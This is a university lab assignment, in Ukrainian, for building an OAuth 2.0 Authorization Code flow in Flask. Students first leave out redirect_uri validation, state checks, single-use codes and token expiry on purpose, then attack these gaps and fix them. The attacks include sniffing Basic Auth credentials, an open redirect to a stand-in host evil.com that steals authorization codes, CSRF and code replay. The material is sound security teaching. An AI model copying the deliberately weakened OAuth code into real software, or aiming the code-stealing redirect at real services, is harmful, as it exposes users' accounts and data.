---
title: "Лабораторна робота 4. OAuth 2.0"
subtitle: "Від перехоплення паролів до делегованої авторизації"
author: "Курс: Захист інформації — Львівський національний університет імені Івана Франка"
date: "2025/2026 навчальний рік"
geometry: margin=2.2cm
fontsize: 11pt
mainfont: "Times New Roman"
monofont: "Menlo"
header-includes:
  - \usepackage{fancyhdr}
  - \pagestyle{fancy}
  - \fancyhead[L]{Захист інформації}
  - \fancyhead[R]{Лабораторна 4 — OAuth 2.0}
  - \usepackage{tcolorbox}
  - \usepackage{enumitem}
  - \setlist{nosep}
  - \renewcommand{\arraystretch}{1.3}
---

# Загальна інформація

**Лекція:** 4 — Архітектура OAuth 2.0\
**Максимальний бал:** 100\
**Технології:** будь-яка мова програмування на вибір студента (Python/Flask, Node.js/Express, Java/Spring, Go, C\#/.NET тощо), SQLite або інша БД, tcpdump або Wireshark. Приклади коду подані на Python/Flask, але студент може використовувати будь-який стек — головне розуміти, що відбувається на кожному кроці.\
**Початок:** 6 березня 2026\
**Фінальний дедлайн:** 30 липня 2026

## Використання AI-інструментів

У цій лабораторній роботі **дозволяється та заохочується** використання AI-інструментів (ChatGPT, Claude, GitHub Copilot тощо) для генерації коду. Мета роботи — зрозуміти *архітектуру* OAuth 2.0 та її вразливості, а не синтаксис конкретної мови програмування. Проте студент **повинен розуміти** кожен рядок згенерованого коду та вміти пояснити його на захисті.

## Вибір варіанту

Студент обирає **один із двох варіантів** застосунку. Структура, етапи та оцінювання — однакові для обох.

| Варіант | Застосунок | Ресурс | Зовнішній клієнт |
|---------|-----------|--------|-----------------|
| **A** | **SecureNotes** — захищені нотатки | Нотатки (title, content) | NotesExporter — експорт нотаток |
| **B** | **PhotoVault** — фотоальбоми | Фото (album, filename, description) | PhotoPrinter — друк фотографій |

Студент також може **запропонувати власну ідею** застосунку (месенджер, список завдань, бібліотека книг тощо) — за умови погодження з викладачем. Головне — наявність ресурсу, до якого зовнішній додаток запитує доступ через OAuth 2.0.

\newpage

# Структура оцінювання

| \# | Завдання | Балів | Дедлайн |
|----|----------|-------|---------|
| 0 | Перехоплення паролів (password anti-pattern) | 10 | 20 березня |
| 1 | Resource Server — API ресурсів | 10 | 3 квітня |
| 2 | Реєстрація OAuth-клієнтів | 10 | 17 квітня |
| 3 | Authorization Endpoint + Consent Screen | 15 | 8 травня |
| 4 | Token Endpoint | 10 | 22 травня |
| 5 | Захищений ресурс з Bearer Token | 10 | 5 червня |
| 6 | Зовнішній Client Application | 15 | 26 червня |
| 7 | Атака на власну реалізацію | 10 | 17 липня |
| 8 | Виправлення вразливостей | 10 | 30 липня |
| | **Разом** | **100** | |

### Політика дедлайнів

- Здача відбувається **на лекції або практичному занятті** (очно або онлайн під час заняття, з демонстрацією).
- **Запізнення до 1 заняття:** штраф --10% від балів за етап.
- **Запізнення до 2 занять:** штраф --20% від балів за етап.
- **Запізнення понад 2 заняття:** етап не зараховується (0 балів).
- Етапи здаються **послідовно** — не можна здати етап 4, не здавши етапи 1–3.
- Дострокова здача — без обмежень, можна здати кілька етапів одночасно.

---

# Обґрунтування кожного етапу

Кожен етап лабораторної відповідає конкретній проблемі безпеки або архітектурному рішенню з RFC 6749:

| Етап | Навіщо це потрібно |
|------|-------------------|
| **0. Перехоплення** | Демонструє password anti-pattern — головну мотивацію створення OAuth. Студент бачить *на власні очі*, що Basic Auth передає credentials у відкритому вигляді. |
| **1. Resource Server** | Фундамент: без ресурсу нема чого захищати. Студент створює API, яке пізніше буде захищене токенами. |
| **2. Реєстрація клієнтів** | RFC 6749, Section 2: кожен клієнт має бути зареєстрований з `client_id` та `client_secret`. Без цього сервер не може відрізнити легітимний клієнт від зловмисного. |
| **3. Authorization + Consent** | RFC 6749, Section 4.1, кроки 1-2: ключова ідея OAuth — користувач *явно* дає згоду на доступ. Навмисні пропуски (redirect\_uri, state) — підготовка до етапу 7. |
| **4. Token Endpoint** | RFC 6749, Section 4.1, кроки 3-4: back-channel обмін code на token. Code передається через браузер (front-channel), тому має бути одноразовим — але студент це зрозуміє лише на етапі 7. |
| **5. Bearer Token** | RFC 6750: механізм авторизації запитів. Студент реалізує перевірку scopes — принцип найменших привілеїв (Principle of Least Privilege). |
| **6. Client App** | Повний end-to-end flow з двома серверами. Студент бачить OAuth очима *клієнта* — це критично для розуміння, хто що бачить у протоколі. |
| **7. Атака** | OWASP OAuth Security: студент стає *зловмисником* і експлуатує вразливості, які сам залишив. Практичний досвід цінніший за теоретичне знання. |
| **8. Виправлення** | Замикає цикл: зрозумів проблему → атакував → виправив. Кожна перевірка в OAuth існує *не просто так* — студент тепер знає чому. |

\newpage

# Передумови

```bash
pip install flask requests
```

Для завдання 0 — один із інструментів для перехоплення трафіку:

- **macOS:** `tcpdump` (вбудований), `ngrep` (`brew install ngrep`), або Wireshark
- **Linux:** `tcpdump` (вбудований), `ngrep` (`apt install ngrep`), або Wireshark
- **Windows:** Wireshark (рекомендовано), або `ngrep` через Npcap

---

# Завдання 0: Перехоплення паролів (10 балів)

## Мета

Продемонструвати, чому password anti-pattern — це загроза. Студент запускає HTTP-сервер з Basic Auth, перехоплює credentials мережевим сніфером і робить висновок.

## Крок 1. Створити сервер

Файл `victim_server.py` — простий HTTP-сервер (без HTTPS — навмисно):

```python
from flask import Flask, request, jsonify

app = Flask(__name__)
USERS = {"maksym": "supersecret123"}

@app.route("/notes")
def get_notes():
    auth = request.authorization
    if not auth or USERS.get(auth.username) != auth.password:
        return "Unauthorized", 401,
               {"WWW-Authenticate": "Basic realm='notes'"}
    return jsonify({"notes": ["Нотатка 1", "Нотатка 2"]})

if __name__ == "__main__":
    app.run(port=8080)
```

## Крок 2. Запустити сніфер

**macOS (tcpdump):**

```bash
sudo tcpdump -i lo0 -A -s 0 'tcp port 8080'
```

**Linux (tcpdump):**

```bash
sudo tcpdump -i lo -A -s 0 'tcp port 8080'
```

**macOS/Linux (ngrep):**

```bash
sudo ngrep -d lo0 -q -W byline 'Authorization' port 8080  # macOS
sudo ngrep -d lo -q -W byline 'Authorization' port 8080    # Linux
```

**Windows/macOS/Linux (Wireshark):**

1. Відкрити Wireshark, обрати інтерфейс Loopback (lo0/lo/Npcap Loopback)
2. Фільтр: `tcp.port == 8080 && http.authbasic`

## Крок 3. Надіслати запит

```bash
curl -u maksym:supersecret123 http://localhost:8080/notes
```

## Що здати

1. Скріншот перехопленого трафіку з видимим `Authorization: Basic bWFrc3ltOnN1cGVyc2VjcmV0MTIz`
2. Результат декодування: `echo "bWFrc3ltOnN1cGVyc2VjcmV0MTIz" | base64 -d`
3. Відповідь (2-3 речення): *"Чому передача паролю третьому додатку — катастрофа, навіть через HTTPS?"*

## Критерії оцінювання

| Критерій | Балів |
|----------|-------|
| Сніфер перехопив credentials (скріншот) | 5 |
| Base64 декодовано, credentials видно у відкритому вигляді | 2 |
| Відповідь на запитання (немає відкликання, повний доступ, поширення секрету) | 3 |

\newpage

# Проєкт: OAuth 2.0 з нуля

Ви побудуєте повну реалізацію OAuth 2.0 Authorization Code Flow. Архітектура:

```
Порт 5000: Ваш застосунок (Authorization Server + Resource Server)
Порт 5001: Зовнішній клієнт (Client Application)
```

**Важливо:** в етапах 3–5 ви навмисно пропустите деякі перевірки безпеки. В етапі 7 ви атакуєте власний сервер, а в етапі 8 — виправите вразливості. Це навчить вас, *чому* кожна перевірка існує в RFC 6749.

---

## Варіант A: SecureNotes

**Ідея:** REST API для захищених нотаток. Зовнішній додаток NotesExporter хоче читати нотатки користувача для експорту у PDF.

**Ресурс:** нотатки

| Поле | Тип | Опис |
|------|-----|------|
| id | INTEGER | Первинний ключ |
| user\_id | INTEGER | Власник |
| title | TEXT | Заголовок нотатки |
| content | TEXT | Тіло нотатки |

**Scopes:**

- `notes:read` — читання нотаток
- `notes:write` — створення та редагування
- `notes:delete` — видалення

**Зовнішній клієнт:** NotesExporter (порт 5001) — читає нотатки через `notes:read`.

---

## Варіант B: PhotoVault

**Ідея:** REST API для зберігання фотоальбомів. Зовнішній додаток PhotoPrinter хоче переглядати фото для друку.

**Ресурс:** фотографії

| Поле | Тип | Опис |
|------|-----|------|
| id | INTEGER | Первинний ключ |
| user\_id | INTEGER | Власник |
| album | TEXT | Назва альбому |
| filename | TEXT | Ім'я файлу |
| description | TEXT | Опис фото |

**Scopes:**

- `photos:read` — перегляд фото та альбомів
- `photos:upload` — завантаження нових фото
- `photos:delete` — видалення фото

**Зовнішній клієнт:** PhotoPrinter (порт 5001) — читає фото через `photos:read`.

---

*Далі етапи описані універсально. Замініть "ресурс" на нотатки/фото відповідно до вашого варіанту.*

\newpage

## Етап 1: Resource Server — API ресурсів (10 балів)

### Мета

Створити REST API з CRUD-операціями та простою аутентифікацією (session-based).

### Що реалізувати

Файл `server.py`:

1. Ініціалізація Flask + SQLite (таблиці `users` та ваш ресурс)
2. `POST /register` — реєстрація користувача (username, password)
3. `POST /login` — логін, зберегти `user_id` у `session`
4. `GET /<ресурс>` — список ресурсів поточного користувача
5. `POST /<ресурс>` — створити ресурс
6. `DELETE /<ресурс>/<id>` — видалити (лише власний)

### Каркас коду

```python
from flask import Flask, request, jsonify, session
import sqlite3, os

app = Flask(__name__)
app.secret_key = os.urandom(32)
DATABASE = "app.db"

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    db = get_db()
    db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL);
        -- TODO: таблиця вашого ресурсу
    """)
    db.close()

# TODO: реалізувати endpoints
```

### Очікуваний результат

```bash
curl -c cookies.txt -X POST http://localhost:5000/register \
  -H "Content-Type: application/json" \
  -d '{"username":"maksym","password":"secret"}'

curl -b cookies.txt http://localhost:5000/<ресурс>
# [{"id":1,"title":"...","content":"..."}]
```

### Критерії

| Критерій | Балів |
|----------|-------|
| Реєстрація + логін працюють | 3 |
| CRUD для ресурсу (GET, POST, DELETE) | 5 |
| Ресурси ізольовані між користувачами | 2 |

\newpage

## Етап 2: Реєстрація OAuth-клієнтів (10 балів)

### Мета

Дозволити стороннім додаткам реєструватися як OAuth-клієнти.

### Що реалізувати

1. Таблиця `oauth_clients`:

```sql
CREATE TABLE IF NOT EXISTS oauth_clients (
    client_id TEXT PRIMARY KEY,
    client_secret TEXT NOT NULL,
    redirect_uri TEXT NOT NULL,
    name TEXT NOT NULL
);
```

2. `POST /oauth/clients` — реєстрація клієнта:
   - `client_id` = `secrets.token_hex(16)`
   - `client_secret` = `secrets.token_hex(32)`
   - Зберегти разом із `name` та `redirect_uri`

3. `GET /oauth/clients` — список клієнтів (**без** `client_secret`)

### Очікуваний результат

```bash
curl -X POST http://localhost:5000/oauth/clients \
  -H "Content-Type: application/json" \
  -d '{"name":"NotesExporter",
       "redirect_uri":"http://localhost:5001/callback"}'
# {"client_id":"a1b2c3...","client_secret":"9f8e7d..."}
```

### Критерії

| Критерій | Балів |
|----------|-------|
| Таблиця створюється при старті | 2 |
| POST /oauth/clients генерує client\_id + client\_secret | 4 |
| Використано `secrets` (не `random`) | 2 |
| GET /oauth/clients не повертає client\_secret | 2 |

\newpage

## Етап 3: Authorization Endpoint + Consent Screen (15 балів)

### Мета

Реалізувати сторінку згоди (consent) та генерацію authorization code.

### Навмисні пропуски безпеки (НЕ виправляти зараз!)

- **НЕ** перевіряти `redirect_uri` проти зареєстрованого
- **НЕ** вимагати параметр `state`
- Authorization code **без** обмеження часу

Ці вразливості ви будете експлуатувати в етапі 7.

### Що реалізувати

1. Таблиця `authorization_codes`:

```sql
CREATE TABLE IF NOT EXISTS authorization_codes (
    code TEXT PRIMARY KEY,
    client_id TEXT NOT NULL,
    user_id INTEGER NOT NULL,
    scope TEXT NOT NULL,
    redirect_uri TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

2. `GET /oauth/authorize?client_id=...&redirect_uri=...&scope=...&state=...`
   - Перевірити, що `client_id` існує
   - Перевірити, що користувач залогінений
   - Показати HTML-сторінку згоди (consent screen)
   - **НЕ перевіряти redirect\_uri** (навмисна вразливість!)

3. `POST /oauth/authorize` — обробка форми:
   - "Дозволити" → `code = secrets.token_urlsafe(32)`, redirect на `redirect_uri?code=...&state=...`
   - "Відхилити" → redirect на `redirect_uri?error=access_denied`

### Критерії

| Критерій | Балів |
|----------|-------|
| GET /oauth/authorize показує consent screen | 4 |
| Перевірка що client\_id існує | 2 |
| Перевірка що користувач залогінений | 2 |
| POST генерує code і робить redirect | 4 |
| "Відхилити" повертає error=access\_denied | 3 |

\newpage

## Етап 4: Token Endpoint (10 балів)

### Мета

Реалізувати обмін authorization code на access token.

### Навмисні пропуски безпеки (НЕ виправляти зараз!)

- Authorization code можна використати **багато разів**
- Токен **без терміну дії**

### Що реалізувати

1. Таблиця `access_tokens`:

```sql
CREATE TABLE IF NOT EXISTS access_tokens (
    token TEXT PRIMARY KEY,
    client_id TEXT NOT NULL,
    user_id INTEGER NOT NULL,
    scope TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

2. `POST /oauth/token` з `grant_type=authorization_code`:
   - Перевірити `client_id` + `client_secret`
   - Перевірити `code` (існує, належить `client_id`)
   - Згенерувати `access_token = secrets.token_urlsafe(32)`
   - **НЕ видаляти** code (навмисна вразливість!)
   - **НЕ додавати** `expires_in` (навмисна вразливість!)
   - Повернути: `{"access_token":"...","token_type":"Bearer","scope":"..."}`

### Критерії

| Критерій | Балів |
|----------|-------|
| POST /oauth/token приймає grant\_type=authorization\_code | 2 |
| Перевірка client\_id + client\_secret | 3 |
| Перевірка code (існує, належить client\_id) | 3 |
| Повертає access\_token у правильному форматі | 2 |

\newpage

## Етап 5: Захищений ресурс з Bearer Token (10 балів)

### Мета

Дозволити доступ до ресурсів через `Authorization: Bearer <token>` із перевіркою scopes.

### Що реалізувати

1. Декоратор `require_token(required_scope)`:
   - Витягнути токен з заголовка `Authorization: Bearer ...`
   - Знайти токен у БД
   - Перевірити scope

2. Новий endpoint `GET /api/<ресурс>` — працює з токеном (не з сесією)

3. Перевірка scopes: якщо токен має `read`, а endpoint вимагає `write` → `403 Forbidden`

### Очікуваний результат

```bash
# Валідний токен
curl -H "Authorization: Bearer TOKEN" http://localhost:5000/api/<ресурс>
# [...дані...]

# Без токена → 401
# Невалідний токен → 401
# Недостатній scope → 403
```

### Критерії

| Критерій | Балів |
|----------|-------|
| Bearer token витягується з заголовка | 2 |
| Токен валідується через БД | 3 |
| Scope перевіряється | 3 |
| Правильні HTTP-коди (401, 403) | 2 |

\newpage

## Етап 6: Зовнішній Client Application (15 балів)

### Мета

Створити окремий Flask-додаток на порту 5001, який виконує повний Authorization Code Flow.

### Що реалізувати

Файл `client_app.py`:

1. `/` — головна сторінка з кнопкою "Підключити [ваш застосунок]"
2. `/connect` — redirect на authorization server:
   - Згенерувати `state = secrets.token_urlsafe(16)`
   - Зберегти в `session["oauth_state"]`
   - Redirect на `AUTH_SERVER/oauth/authorize?client_id=...&redirect_uri=...&scope=...&state=...`
3. `/callback` — обробка відповіді:
   - Отримати `code` та `state` з query parameters
   - Обміняти `code` на `access_token` через POST на `AUTH_SERVER/oauth/token`
   - Зберегти `access_token` у session
4. `/<ресурс>` — показати дані, отримані через Bearer token

### Повний flow

```
1. Відкрити http://localhost:5001/
2. Натиснути "Підключити"
3. → Redirect на http://localhost:5000/oauth/authorize?...
4. Залогінитись (якщо потрібно)
5. Consent screen → "Дозволити"
6. → Redirect на http://localhost:5001/callback?code=...&state=...
7. Client обмінює code на token (back-channel)
8. → Redirect на http://localhost:5001/<ресурс>
9. Дані відображаються!
```

### Критерії

| Критерій | Балів |
|----------|-------|
| /connect генерує state і робить redirect | 3 |
| /callback отримує code і обмінює на token | 5 |
| Сторінка з даними через Bearer token | 4 |
| Повний flow працює end-to-end (демонстрація) | 3 |

\newpage

## Етап 7: Атака на власну реалізацію (10 балів)

### Мета

Знайти та експлуатувати вразливості, навмисно залишені в етапах 3–4.

Для кожної атаки студент має: описати вразливість, показати proof-of-concept, пояснити наслідки.

### Атака 1: Open Redirect (відсутня валідація redirect\_uri)

Сервер не перевіряє `redirect_uri` — зловмисник підставляє свій URL:

```
http://localhost:5000/oauth/authorize?client_id=REAL_CID
    &redirect_uri=http://evil.com:9999/steal
    &scope=<ресурс>:read&state=x
```

Створити `evil_server.py` (порт 9999), який перехоплює authorization code. Пройти flow — показати, що code потрапив на зловмисний сервер.

### Атака 2: CSRF (відсутній state)

Зловмисник проходить flow сам, отримує code, надсилає жертві пряме посилання:

```
http://localhost:5001/callback?code=ATTACKERS_CODE
```

Якщо client\_app не перевіряє state — жертва працює з акаунтом зловмисника.

### Атака 3: Повторне використання authorization code

```bash
# Перший обмін — отримали token
curl -X POST http://localhost:5000/oauth/token ...
# Другий обмін ТОГО Ж code — ще один token!
curl -X POST http://localhost:5000/oauth/token ...
```

### Атака 4: Вічний токен

Токен працює без обмеження часу. Якщо вкрадено — доступ назавжди.

### Критерії

| Критерій | Балів |
|----------|-------|
| Open Redirect: evil\_server перехоплює code (скріншот) | 3 |
| CSRF: callback приймає чужий code без перевірки | 3 |
| Replay: code використано двічі, отримано два токени | 2 |
| Вічний токен: описано загрозу | 2 |

\newpage

## Етап 8: Виправлення вразливостей (10 балів)

### Мета

Закрити всі вразливості з етапу 7 та підтвердити, що атаки більше не працюють.

### Виправлення 1: Валідація redirect\_uri (exact match)

У `GET /oauth/authorize` — порівняти `redirect_uri` з параметра із зареєстрованим у `oauth_clients`. При невідповідності — повернути помилку 400, **не робити redirect**.

### Виправлення 2: Перевірка state

У `client_app.py` — порівняти `state` з відповіді із збереженим у `session["oauth_state"]`. При невідповідності — повернути 403 (CSRF detected).

### Виправлення 3: Одноразовий authorization code

У `POST /oauth/token` — після успішного обміну видалити code з БД:

```python
db.execute("DELETE FROM authorization_codes WHERE code=?", (code,))
```

### Виправлення 4: Термін дії токена

Додати `expires_at` до `access_tokens`. При створенні — 15 хвилин. При валідації — перевіряти, чи не прострочений. Повертати `expires_in: 900` у відповіді.

### Критерії

| Критерій | Балів |
|----------|-------|
| redirect\_uri перевіряється, open redirect не працює | 3 |
| state перевіряється, CSRF заблоковано | 3 |
| Code одноразовий — повторний обмін повертає помилку | 2 |
| Токен має expiry, після 15 хв — 401 | 2 |

\newpage

# Формат здачі

## Завдання 0

Скріншоти + текстова відповідь (PDF або Markdown).

## Проєкт (етапи 1–8)

Git-репозиторій з комітами по етапах:

- Кожен етап = окремий коміт (або серія комітів)
- `README.md` з інструкцією запуску
- Скріншоти для етапів 6–8 (демонстрація flow, атак, виправлень)

**Структура репозиторію:**

```
oauth-lab/
    server.py              # Ваш застосунок (порт 5000)
    client_app.py           # Зовнішній клієнт (порт 5001)
    evil_server.py          # Зловмисний сервер (етап 7)
    victim_server.py        # Завдання 0
    app.db                  # SQLite (автостворення)
    README.md
    screenshots/
```

## Захист роботи

На захисті студент повинен:

1. Запустити обидва сервери та продемонструвати повний OAuth flow
2. Показати кожну з 4 атак (етап 7)
3. Показати, що виправлення блокують атаки (етап 8)
4. Відповісти на запитання викладача щодо будь-якого рядка коду

---

# Підказки

- Запускайте два сервери у двох терміналах: `python server.py` та `python client_app.py`
- Flask sessions використовують cookies — різні порти = різні cookies
- Використовуйте `print()` для відладки — дивіться, що приходить у кожен endpoint
- Якщо загубились — перечитайте RFC 6749 Section 4.1 (Authorization Code Grant)
- AI-інструменти допоможуть з кодом, але *розуміння* — ваша відповідальність
